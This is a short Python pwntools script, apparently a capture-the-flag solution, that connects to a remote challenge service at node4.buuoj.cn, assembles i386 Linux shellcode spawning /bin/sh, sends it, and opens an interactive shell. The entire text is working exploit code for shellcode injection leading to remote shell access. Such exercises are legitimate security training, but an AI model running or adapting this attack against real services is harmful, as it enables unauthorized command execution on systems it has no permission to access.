from pwn import *


# p = process("./runit")
p = remote("node4.buuoj.cn", 29830)

context(os="linux", arch="i386")

# shellcode
code = asm(shellcraft.sh())
p.send(code)

p.interactive()


